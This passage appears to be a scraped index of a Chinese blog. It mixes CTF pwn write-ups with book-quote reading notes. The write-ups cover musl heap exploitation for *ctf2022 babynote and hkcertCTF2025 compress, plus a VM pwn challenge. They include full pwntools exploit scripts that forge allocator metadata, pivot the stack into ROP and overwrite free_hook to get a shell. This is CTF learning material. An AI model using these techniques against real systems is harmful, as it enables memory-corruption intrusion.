触发queue还是需要通过get_meta的检查，然后就是走nontrivial_free的else_if分支： freeable == 0 这里sc等于几就是进第几个active链表，但是需要sc\u003c48 # queue 把fake_meta链入active[8] # reset fake meta , free fake chunk 2 queue it(queue the fake meta) last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta fake_meta = p64(0) # prev fake_meta += p64(0) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'z' * 0xa90 payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' #z() find(0x1200, payload) for _ in range(2): find(0x28, b'a' * 0x28) pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"7\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) lg(\"fake_meta_addr\") 接着把fake_meta-\u003emem改为stdout-0x10即可把堆块申请到stdout上了 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#第二步"},{"categories":["pwn"],"collections":null,"content":"流程\r整体流程可以分为这三步： 泄露elfbase、libc_base 泄露secret 把堆块申请在stdout 第一步\r在前面两步泄露地址中，只需要关注active[2]这个链表（0x30大小） add一次，申请一个0x30大小的note1，来防止free掉group中所有chunk时，将整个group归还给堆管理器 Note\r接下来需要注意，group对chunk的管理策略： malloc的时候取的是avail_mask中最低位的堆块，也就是一个group中最低地址的堆块 被free掉的堆块，会把它的free_mask置1，avail_mask不动还是0 当一个group中没有avail堆块时，会把被free的堆块标记成avail，free_mask就置0了 接着把note2申请到active[2]的第十个chunk的位置，note2_content申请到第二个的位置 申请note3，并把note2给free掉，此时note3还记录着note2的位置即第十个chunk的位置 接着在note2_content的位置申请note4，泄露出note4记录的两个堆地址 Note\rmusl申请的堆块，有的大小能泄露elfbase，有的能泄露libc\r## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #参考文章中，这里我本地不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下，我本地这个是对的 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") 第二步\r把原本note2中执行content的指针改成malloc_context，show即可 # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") 第三步\r此时，能通过修改note2_content来进行任意地址读和free 有了elfbase、libc_base、secret，接下来就是把堆块申请到stdout上，通过puts打IO 把堆块申请到stdout上，需要： 在stdout-0x10伪造一个group。通过dequeue，在stdout-0x10写上fake_group_addr 利用queue 把fake_meta链入active链表 dequeue 触发dequeue需要fake_meta的构造： 通过get_meta() 所有assert。包括： fake_meta那个页的起始的secret要等于malloc_context的secret fake_meta 中保存的 group 指针要正确 被free掉的chunk的index小于等于fake_meta-\u003elast_idx nontrivial_free() 进入 第一个 if 分支。包括： free_able == 1 伪造prev、next，通过dequeue的unlink写stdout-0x10 然后，通过任意地址free，free掉fake_group的第一个chunk，执行dequeue # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) #dequeue queue 触发queue还是需要通过get_meta的检查，然后就是走nontrivial_free的else_if分支： freeable == 0 这里sc等于几就是进第几个active链表，但是需要sc\u003c48 # queue 把fake_meta链入active[8] # reset fake meta , free fake chunk 2 queue it(queue the fake meta) last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta fake_meta = p64(0) # prev fake_meta += p64(0) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'z' * 0xa90 payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' #z() find(0x1200, payload) for _ in range(2): find(0x28, b'a' * 0x28) pd=p64(elfbase+0x5fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"7\"*0x38,0x28,pd) delet(0x38,b\"a\"*0x38) lg(\"fake_meta_addr\") 接着把fake_meta-\u003emem改为stdout-0x10即可把堆块申请到stdout上了 ","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:2","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#第三步"},{"categories":["pwn"],"collections":null,"content":"exp\rfrom pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address,checksec=False) libc = ELF(\"../musl-libc/v1.2.2\") #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) lgaddr = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) else: # p = process([\"/home/j4f/pwn/challs/heap/musl/musl-libc/v1.2.2\",address]) p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() def cho(num): sla(\"option: \",str(num)) def add(namesz, name, notesz, note): cho(1) sla(b\"name size: \", str(namesz)) # sla(b\"name: \", name) sa(b\"name: \", name) sla(b\"note size: \", str(notesz)) # sla(b\"note content: \", note) sa(b\"note content: \", note) def find(namesz,name): cho(2) sla(\"name size: \",str(namesz)) # sla(\"name: \",name) sa(\"name: \",name) def delet(namesz,name): cho(3) sla(\"name size: \",str(namesz)) # sla(\"name: \",name) sa(\"name: \",name) def remake(): cho(4) ## leak libcbase \u0026\u0026 elfbase add(0x38,b\"a\"*0x38,0x38,b\"a\"*0x38) #防止将整个group归还给堆管理器 cho(4) for _ in range(8): find(0x28,\"a\"*0x28) add(0x38,\"2\"*0x38,0x28,\"2\"*0x28) add(0x38,\"3\"*0x38,0x38,\"3\"*0x38) delet(0x38,\"2\"*0x38) for _ in range(6): find(0x28,\"a\"*0x28) add(0x38,\"4\"*0x38,0x58,\"4\"*0x58) #一个堆块泄露elfbase，一个libc find(0x38,\"2\"*0x38) p.recvuntil(\"0x28:\") libcbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0xb7d60 #这里不太对 libcbase_true=libcbase - 0x2b020 + 0x4000 #调整了一下 elfbase=u64(p64(int(p.recv(16),16),endianness=\"big\")) - 0x4c40 lg(\"libcbase\") lg(\"libcbase_true\") lg(\"elfbase\") # calculate important addr malloc_context = libcbase + 0xb4ac0 # mmap_base = libcbase - 0xa000 mmap_base = libcbase_true - 0x4000 fake_meta_addr = mmap_base + 0x2010 fake_mem_addr = mmap_base + 0x2040 # stdout = libcbase + 0xb4280 stdout = libcbase_true + 0xdb2c0 lg(\"malloc_context\") lg(\"mmap_base\") lg(\"fake_meta_addr\") lg(\"fake_mem_addr\") lg(\"stdout\") # leak secret for _ in range(6): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(malloc_context)+p64(0x38)+p64(0x28)+p64(0) find(0x28,pd) find(0x38,b\"a\"*0x38) p.recvuntil(\"0x28:\") secret=u64(p64(int(p.recv(16),16),endianness=\"big\")) lg(\"secret\") # set fake meta add(0x28,b\"5\"*0x28,0x1200,'\\n') #0x1200:防止将mmap出来的group归还给堆管理器 last_idx, freeable, sc, maplen = 0, 1, 8, 1 #fake meta fake_meta = p64(stdout - 0x18) # prev fake_meta += p64(fake_meta_addr + 0x30) # next fake_meta += p64(fake_mem_addr) # mem fake_meta += p32(0) + p32(0) # avail_mask, freed_mask fake_meta += p64((maplen \u003c\u003c 12) | (sc \u003c\u003c 6) | (freeable \u003c\u003c 5) | last_idx) fake_meta += p64(0) #对齐 #fake group fake_mem = p64(fake_meta_addr) # meta fake_mem += p32(1) + p32(0) payload = b'a' * 0xaa0 #pad,为了页对齐，让secret在页起始位置 #fake meta area payload += p64(secret) + p64(0) payload += fake_meta + fake_mem + b'\\n' find(0x1200,payload) #设置stdout-0x10为fake_group_addr # dequeue 2 set stdout_file - 0x10 (where the final fake group) for _ in range(3): find(0x28,b\"a\"*0x28) pd=p64(elfbase+0x4fc0)+p64(fake_mem_addr+0x10)+p64(0x38)+p64(0x28)+p64(0) add(0x38,b\"6\"*0x38,0x28,pd","date":"2026-01-10","objectID":"/posts/musl_pwn/:3:3","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#exp"},{"categories":["pwn"],"collections":null,"content":"hkcertCTF2025 _ compress\rmusl v1.1.24 有个gadget可以进行栈迁移： pwndbg\u003e x/20i 0x49503+0x7ffff7c00000 0x7ffff7c49503 \u003clongjmp+11\u003e: mov rbx,QWORD PTR [rdi] 0x7ffff7c49506 \u003clongjmp+14\u003e: mov rbp,QWORD PTR [rdi+0x8] 0x7ffff7c4950a \u003clongjmp+18\u003e: mov r12,QWORD PTR [rdi+0x10] 0x7ffff7c4950e \u003clongjmp+22\u003e: mov r13,QWORD PTR [rdi+0x18] 0x7ffff7c49512 \u003clongjmp+26\u003e: mov r14,QWORD PTR [rdi+0x20] 0x7ffff7c49516 \u003clongjmp+30\u003e: mov r15,QWORD PTR [rdi+0x28] 0x7ffff7c4951a \u003clongjmp+34\u003e: mov rdx,QWORD PTR [rdi+0x30] 0x7ffff7c4951e \u003clongjmp+38\u003e: mov rsp,rdx =\u003e 0x7ffff7c49521 \u003clongjmp+41\u003e: mov rdx,QWORD PTR [rdi+0x38] 0x7ffff7c49525 \u003clongjmp+45\u003e: jmp rdx 打io_file show泄露出libc，add通过负数偏移，能写libc中的内容 写stdin，stdout不能动，接着往下写rop，栈迁移进行rop from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address,checksec=False) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) lgaddr = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() def add(offset, content): \"\"\"调用 add 函数 offset: 偏移量（可以是负数或大于 0x20 的值，利用检查漏洞） content: 要写入的内容 \"\"\" p.sendlineafter(b'\u003e\u003e', b'1') p.sendlineafter(b'Please input the offset:\\n', str(offset).encode()) p.sendafter(b'Please input the Content:\\n', content) def show(): \"\"\"调用 show 函数\"\"\" p.sendlineafter(b'\u003e\u003e', b'2') show() libc_base = r64() - 0x282e50 - 0x10000 lg(\"libc_base\") # 0x7ffff7c49503 \u003clongjmp+11\u003e: mov rbx,QWORD PTR [rdi] # 0x7ffff7c49506 \u003clongjmp+14\u003e: mov rbp,QWORD PTR [rdi+0x8] # 0x7ffff7c4950a \u003clongjmp+18\u003e: mov r12,QWORD PTR [rdi+0x10] # 0x7ffff7c4950e \u003clongjmp+22\u003e: mov r13,QWORD PTR [rdi+0x18] # 0x7ffff7c49512 \u003clongjmp+26\u003e: mov r14,QWORD PTR [rdi+0x20] # 0x7ffff7c49516 \u003clongjmp+30\u003e: mov r15,QWORD PTR [rdi+0x28] # 0x7ffff7c4951a \u003clongjmp+34\u003e: mov rdx,QWORD PTR [rdi+0x30] # 0x7ffff7c4951e \u003clongjmp+38\u003e: mov rsp,rdx # =\u003e 0x7ffff7c49521 \u003clongjmp+41\u003e: mov rdx,QWORD PTR [rdi+0x38] # 0x7ffff7c49525 \u003clongjmp+45\u003e: jmp rdx libc.address = libc_base magic_gadget = libc_base + 0x49503 pop_rdi_ret = libc_base + 0x14862 pop_rsi_ret = libc_base + 0x1c237 pop_rdx_ret = libc_base + 0x1bea2 pop_rax_ret = libc_base + 0x1b826 ret = libc_base + 0xcdc fake_file_addr = libc_base + 0x292200 libc_end_addr = libc_base + 0x296000 stdin_addr = libc_base + 0x292200 stdout_addr = libc_base + 0x292300 rop_addr = libc_base + 0x292430 stdout_struct = ( p64(0x45) + # +0x00 p64(0x0) + # +0x08 p64(0x0) + # +0x10 p64(libc_base + 0x4a957) + # +0x18 p64(libc_base + 0x39a8) + # +0x20 p64(libc_base + 0x39a8) + # +0x28 p64(0x0) + # +0x30 p64(libc_base + 0x39a8) + # +0x38 p64(0x0) + # +0x40 p64(libc_base + 0x4aac3) + # +0x48 p64(libc_base + 0x4aabb) + # +0x50 p64(libc_base + 0x39a8) + # +0x58 p64(0x0) + # +0x60 p64(0x0) + # +0x68 p64(0x0) + # +0x70 p64(0x1) + # +0x78 p64(0x0) + # +0x80 p64(0xffffffffffffffff) + # +0x88 p64(0xffffffff) + # +0x90 p64(0x0) + # +0x98 p64(0x0) + # +0xA0 p64(0x0) # +0xA8 ) stdout_struct = stdout_struct.ljust(","date":"2026-01-10","objectID":"/posts/musl_pwn/:4:0","tags":null,"title":"通过*ctf2022_babynote入门musl pwn","uri":"/posts/musl_pwn/#hkcertctf2025-_-compress"},{"categories":["reading"],"collections":null,"content":"摘录\rquote\r应警惕的观点：伴侣是不会发生改变的。一旦亲密关系变糟，就无法得到改善。如果爱人曾伤害过你，毫无疑问还会一而再，再而三地伤害你。\rquote\r持有成长信念的人还能心平气和地讨论爱人的缺点；相形之下，持有宿命信念的人一谈到伴侣的缺陷就充满敌意\rquote\r人们究竟要怎样才能与爱恋自己的人快乐相处呢？1.建立对伴侣善意和大度的认知，突出他们的美德而缩小他们的缺陷 2.随着对伴侣了解程度的增加，不断调整自己对理想伴侣的期望\rquote\r对他人的期望能引导我们对他人做出的行为反应，所以期望具有促动作用\rquote\r找到你生命中的真爱并不能让你永远幸福。\rquote\r自主(autonomy)：允许你的伴侣在亲密关系之外还能拥有自己的朋友和兴趣爱好；不要有太强的占有欲。(37%) 相似(similarity)：你和伴侣应该有相似的态度、价值观和兴趣；差别不要太大。(30%) 支持(supportiveness)：提升伴侣的自我价值和自尊；不要粗枝大叶或不够体贴。(27%) 开放(openness)：真诚而又真实地进行自我表露；不要什么都不说。(22%) 忠诚(fidelity)：对你的伴侣保持忠诚；不要出轨。(17%) 共处(togetherness)：一起分享大量的时间；尽量不要上夜班或搬到外地，不要在其他地方花太多时间。(16%) 公平(equity)：秉持公正与公平；不要利用和剥削你的伴侣。(12%) 魔力(magic)：保持浪漫；拒绝平淡。(10%) quote\r翻来覆去的反刍思维(rumination)只会延长我们的痛苦，而反省（即找寻经历中的意义并期望从中学习）则与积极的调适和恢复有关(Saffrey \u0026 Ehrenberg, 2007)\rquote\r为了忘掉前任，他们可以着手浏览约会网站，看看那里都有些什么样的人；焦虑的人把目光投向新朋友，反倒更容易从失败的亲密关系中走出来(Spielmann et al., 2009)。但是，任何人都不应该再去浏览前任的社交网络上的主页；人们用于查看前任主页上的时间越多，其感情创伤愈合并开始新生活所需的时间就越长\rquote\r与那些父母仍维持婚姻的孩子相比，父母离异的孩子在青少年期和成年早期的幸福感都较低。他们的心理适应能力相对低下，体验到更多的抑郁和焦虑，对生活的满意度较低。他们的问题行为更多，如吸毒、违法、少女怀孕、学业不良等问题更为严重。\rquote\r如果孩子生活在持续发生冲突的家庭，父母不离婚则会使他们的情况更糟糕\rquote\r当和平的婚姻破裂时，孩子就会受到伤害；如果家庭充满冲突，则离婚倒会让孩子的境况变得更好\rquote\r如果子女能够免于贫困，得到充满关爱的、可靠的和一致的养育，并远离父母冲突带来的伤害，他们就能快乐地成长\rquote\r人们通常期望男性具有果断自信、自强自立而非温情脉脉、温柔体贴的行为风格，而这种行为风格并不能将他们培养成长期亲密关系中非常理想的伴侣\rquote\r临近、熟识和方便是决定具有奖赏价值的亲密关系能否开始的重要因素。可能我们与许多人都能建立美满的亲密关系，只不过我们与他们永远不会相遇\rquote\r我们并不像自己以为的那样了解或理解自己的伴侣；即使在成功的亲密关系中，仍存在很多误解\rquote\r从长远来看，亲密关系的代价往往比我们预期的要大得多。如果你认为你的亲密关系将带给你源源不断的幸福和喜悦，你肯定会失望\rquote\r约三分之一的人不能轻松舒适地对待相互依赖的亲密感；他们要么担心伴侣不够爱自己，要么在伴侣太亲近时感觉不自在\rquote\r幸福的恋人宽容地看待自己的伴侣及其行为，在有疑问时选择相信伴侣，即使伴侣偶尔行为不当，也仍然认为他们是善良体贴的\rquote\r在幸福的亲密关系中，当激情减退时，取而代之的是一种深厚、饱含感情的友谊，这种友谊对身处其中的人来说丰富、温暖且令人满意。\rquote\r也许最重要的是，如果我们努力，几乎所有人都能成为更体贴、更有魅力、更有价值的伴侣。当男性有动力进行非言语沟通时，他们会在这方面做得更好。如果我们能花时间检查自己理解的准确性，就能减少或消除言语上的误解。只要用心去做，我们就可以在对待伴侣时更礼貌、更无私、更体贴、更少挑剔。\rquote\r对一段伴侣关系做出承诺、希望并期望这段关系继续下去的人，其思维和行为方式都不同于承诺较少的伴侣(Ogolsky \u0026 Bowers, 2013)。当他们预见到与伴侣未来的幸福生活时(Lemay, 2016)，他们会以有助于维系伴侣关系的方式看待自己、伴侣及双方关系，并且以能够避免或化解冲突、充实亲密关系的方式行事。\r","date":"2025-10-23","objectID":"/posts/read_qmgx/:1:0","tags":null,"title":"《亲密关系》","uri":"/posts/read_qmgx/#摘录"},{"categories":["reading"],"collections":null,"content":"摘录\rquote\r我们不应为某件事情过分高兴或者过分悲伤，原因之一就是一切事物都在改变，另一个原因是我们对于何为有利、何为不利的判断是虚幻的\rquote\r我们幸福的原因存在于我们的自身之内，而不是自身之外\rquote\r人的内心快乐抑或内心痛苦首先就是人的感情、意欲和思想的产物。而人自身之外的所有事物，对于人的幸福都只是间接地发挥影响\rquote\r我们唯一能够做到的就是尽可能充分地利用我们既定的个性。因此，我们应该循着符合我们个性的方向，努力争取适合个性的发展，除此之外则一概避免。所以，我们必须选择与我们个性相配的地位、职业和生活方式\rquote\r一个人的个性及其价值，才唯一直接与他的幸福有关\rquote\r保持身体健康的手段无非就是避免一切纵欲放荡的行为、令人不快和剧烈的情绪动荡，以及长时间紧张的精神劳累；每天至少在户外进行两个小时的身体快速运动；勤洗冷水浴，饮食有节\rquote\r一个人自身拥有越丰富，他对身外之物的需求也就越少，别人对他来说就越不重要\rquote\r为了外在的荣耀、地位、头衔和名声而部分或全部奉献出自己的内在安宁、闲暇和独立——这是极度的愚蠢行为\rquote\r缺乏痛苦的程度是衡量一个人生活是否幸福的标准\rquote\r认清幸福是避免痛苦，而不是寻求快乐：我们不应该以痛苦为代价去购买快乐，甚至只是冒着遭受痛苦的风险去这样做也不行，否则，我们就会为了那些否定、因而是虚幻的东西而付出了肯定和实在的东西。但如果我们牺牲欢娱以避免痛苦，那我们肯定获得收益\rquote\r降低对幸福的期待： 我们对于幸福的过分期待毁坏了这世上的一切，毁坏的程度与我们做梦的程度相一致。谁要是摆脱了过分的期待，除了自己已经拥有的以外，不再奢望更多，那么，他就能够安然无恙地生活下去”（《梅克通信录》）\rquote\r如果你失去一个世界， 不要为此悲伤，因为这是微不足道的； 如果得到一个世界， 不要为此高兴，因为这是微不足道的； 苦乐得失都会过去 都会离开这个世界，因为这都是微不足道的。 ——安瓦里：《苏哈里》\rquote\r人生智慧的重要一点就是在关注现在和计划将来这两者之间达致恰到好处的平衡，这样，现在与将来才不至于互相干扰\rquote\r不要由于在过去我们的希望落空现在就变得忧郁寡欢，或者为了将来操心伤神以致败坏现时\rquote\r我们应该时刻记住：此刻时光匆匆消逝化作神奇的往昔，从此以后，它就存留在我们的记忆里，照射出不朽之光芒。在将来，尤其到了糟糕恶劣的日子，我们的记忆就会拉起帷幕：此刻时光就会成为我们内心眷恋和思念的对象。\rquote\r如果不跟别人作比较，那我们就会为我们所得到的感到快乐；如果由于别人比我们更加幸运而内心不安，那我们将永远不会快乐\rquote\r对于一切涉及痛苦和快乐的事情，我们应该把牢想象力的闸门\rquote\r通常，为了使现时灰暗的生活生色明快，我们盘算着种种美妙的可能，凭空想象出形形色色的诱人的希望，而所有这些都孕育着失望。\rquote\r正如流通的是纸钞，而不是真金白银，同样，在这个世界上，流行的不是发自内心的尊重和真正的友谊，而只是做得尽量逼真和自然地显示尊重和友谊的表面工夫\rquote\r“唯一能够取悦别人的方式就是把自己裹以最傻呆的动物的外皮。”显示自己的聪明智慧其实就是间接地指责别人愚蠢和无能\rquote\r一个明智的人其实就是一个不会被事物恒久不变的表面所欺骗的人，他甚至预见到了事情即将往哪一方向变化\rquote\r帮助我们以镇定自若的态度接受发生在我们身上的不幸和灾祸的最佳方法，莫过于确信这一真理：“发生的所有大大小小的事情，都是必然地发生。”\rquote\r所有的事物作为客体，亦即纯粹作为表象而存在时，毫无例外都是令人愉快的；但当这些事物作为主体存在，亦即存在于意欲之中时，却都沉浸在痛苦和悲哀之中\rquote\r一切事物在被观照时都是愉悦的，但在具体存在时，却是可怕的\rquote\r那些画像之所以具有如此的魅力，正是因为这些纯粹只是画像而已，它们并不是真实的\rquote\r人生经验的首要任务，就是要摆脱那些在我们青春期扎根头脑的幻想和虚假概念\r","date":"2025-10-23","objectID":"/posts/read_rsdzh/:1:0","tags":null,"title":"《人生的智慧》","uri":"/posts/read_rsdzh/#摘录"},{"categories":["pwn"],"collections":null,"content":"[OGeek2019 Final]OVM\rbuuctf的一道题 docker pull roderickchan/debug_pwn_env:16.04-2.23-0ubuntu11.3-20240412 先输入pc、sp、code size pc：将指令写入memory的偏移，置0就行 sp：push、pop指令写入栈的偏移，置0就行 code size：增加一条opcode，opcode size就要加1 vm指令： 0x10：mov reg[high]，low 0x20：mov reg[high]，0 0x30：mov reg[high]，memory[reg[low]] 0x40：mov memory[reg[low]]，reg[high] 0x50：PUSH：push reg[high] ，sp++ 0x60：POP： pop[high]，sp– 0x70：ADD： reg[high] = reg[low] + reg[medium] 0x80：SUB：reg[high] = reg[medium] - reg[low] 0x90：AND： reg[high] = reg[low] \u0026 reg[medium] 0xa0：OR：reg[high] = reg[low] | reg[medium] 0xb0：XOR：reg[high] = reg[low] ^ reg[medium] 0xc0：SHL：reg[high] = reg[medium] « reg[low] 0xd0：SHR：reg[high] = reg[medium] » reg[low] 0xe0：EXIT：停止执行 ","date":"2025-10-23","objectID":"/posts/vmpwn/:1:0","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#ogeek2019-finalovm"},{"categories":["pwn"],"collections":null,"content":"思路\r可以往memory[]中写入负数偏移，指向got表中的stderr_ptr，再根据偏移找到free_hook，让comment指向free_hook-0x8,往free_hook-0x8开始的数据写入b'/bin/sh\\x00'+p64(sys_addr),这样free(comment)，就是system(\"/bin/sh\") ","date":"2025-10-23","objectID":"/posts/vmpwn/:1:1","tags":null,"title":"VMpwn练习","uri":"/posts/vmpwn/#思路"},{"categories":["pwn"],"collections":null,"content":"exp\r（拿了别的师傅的exp） from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" sbase 0x202060 sbase 0x202460 c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"node5.buuoj.cn\",29198 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() #def opcode(op,high,medium,low): # pl = (op \u003c\u003c 24) + (high \u003c\u003c 16) + (medium \u003c\u003c 8) + (low) # print(\"---\u003e\",hex(pl)) # sl(str(pl)) #sla(b\"PC: \",str(0)) #sla(b\"SP: \",str(1)) #sla(b\"CODE SIZE: \",str(4)) #ru(b\"CODE: \") ##create a stderr address in reg array #opcode(0x10,0,0,26) #mov reg[0],26 #opcode(0x80,2,1,0) #reg[2]=reg[1]-reg[0] #opcode(0x30,4,0,2) #mov reg[4],memory[reg[2]] class VM: def __init__(self): self.instructions = [] def opcode(self, op, high, medium, low): self.instructions.append((op \u003c\u003c 24) | (high \u003c\u003c 16) | (medium \u003c\u003c 8) | low) def send_all(self): sla(b\"PC: \", \"0\") sla(b\"SP: \", \"0\") sla(b\"CODE SIZE: \", str(len(self.instructions))) ru(b\"CODE: \") for instr in self.instructions: sl(str(instr)) # - 0x10：mov reg[high]，low # - 0x20：mov reg[high]，0 # - 0x30：mov reg[high]，memory[reg[low]] # - 0x40：mov memory[reg[low]]，reg[high] # - 0x50：PUSH：push reg[high] ，sp++ # - 0x60：POP： pop[high]，sp-- # - 0x70：ADD： reg[high] = reg[low] + reg[medium] # - 0x80：SUB：reg[high] = reg[medium] - reg[low] # - 0x90：AND： reg[high] = reg[low] \u0026 reg[medium] # - 0xa0：OR：reg[high] = reg[low] | reg[medium] # - 